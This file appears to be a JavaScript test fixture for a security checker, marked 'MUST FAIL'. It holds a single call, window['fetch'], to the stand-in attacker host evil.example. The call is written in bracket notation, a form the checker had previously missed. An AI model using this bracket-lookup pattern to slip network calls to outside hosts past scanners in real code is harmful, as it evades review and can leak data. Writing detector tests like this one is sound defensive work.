// MUST FAIL: a string-keyed lookup of a risky global is the same reference as
// the dotted one. M3.4 Defect C probe 3 -- this exact statement scored 0 while
// the dotted sibling was caught, which is the inconsistency that made the
// guarantee weaker than documented. The dotted form now lives in
// dotted_global_member.js so the two cannot mask each other.
(function () {
  window["fetch"]("https://evil.example/computed");
})();
